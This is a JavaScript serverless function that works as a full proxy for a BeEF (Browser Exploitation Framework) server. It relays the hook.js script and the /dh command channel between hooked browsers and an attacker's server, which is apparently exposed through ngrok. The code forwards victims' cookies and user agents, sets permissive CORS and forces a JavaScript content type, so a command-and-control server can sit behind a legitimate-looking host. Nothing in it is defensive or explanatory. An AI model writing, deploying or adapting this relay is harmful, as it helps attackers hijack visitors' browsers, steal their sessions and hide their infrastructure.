/**
 * Vercel Serverless Function - Full BeEF Proxy
 * Proxies ALL BeEF communication (/dh, /hook.js, etc.) with proper CORS and Content-Type
 */

export default async function handler(req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.setHeader("Access-Control-Allow-Credentials", "true");

  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  const beefServerUrl = process.env.BEEF_SERVER_URL;
  if (!beefServerUrl) {
    console.error("BEEF_SERVER_URL environment variable not set");
    res.status(500).send("// Configuration error");
    return;
  }

  // Get the requested path from query parameter
  // URL format: /api/beef-proxy?path=/dh&params=...
  const { path, ...otherParams } = req.query;

  if (!path) {
    res.status(400).send("// Missing path parameter");
    return;
  }

  // Build the full BeEF URL
  const beefUrl = new URL(path, beefServerUrl);

  // Append all other query parameters
  Object.entries(otherParams).forEach(([key, value]) => {
    beefUrl.searchParams.append(key, value);
  });

  // Also append original query string from the request URL
  if (req.url.includes("?")) {
    const originalQuery = req.url.split("?")[1];
    const params = new URLSearchParams(originalQuery);
    params.forEach((value, key) => {
      if (key !== "path") {
        beefUrl.searchParams.set(key, value);
      }
    });
  }

  try {
    console.log(`[BeEF Proxy] Proxying: ${req.method} ${beefUrl.toString()}`);

    const response = await fetch(beefUrl.toString(), {
      method: req.method,
      headers: {
        "ngrok-skip-browser-warning": "true",
        "User-Agent": req.headers["user-agent"] || "Mozilla/5.0",
        Accept: "*/*",
        Cookie: req.headers["cookie"] || "",
      },
      body: req.method === "POST" ? JSON.stringify(req.body) : undefined,
    });

    if (!response.ok) {
      console.error(`[BeEF Proxy] BeEF returned ${response.status}`);
      res.status(response.status).send(`// BeEF error: ${response.statusText}`);
      return;
    }

    const contentType = response.headers.get("content-type");
    const body = await response.text();

    // Force correct Content-Type for JSONP responses
    // BeEF uses JSONP which should be application/javascript
    if (path.includes("/dh") || path.includes("/hook.js")) {
      res.setHeader("Content-Type", "application/javascript; charset=utf-8");
    } else if (contentType) {
      res.setHeader("Content-Type", contentType);
    } else {
      res.setHeader("Content-Type", "application/javascript; charset=utf-8");
    }

    res.setHeader("X-Content-Type-Options", "nosniff");
    res.status(200).send(body);
  } catch (error) {
    console.error("[BeEF Proxy] Error:", error.message);
    res.status(502).send(`// Proxy error: ${error.message}`);
  }
}
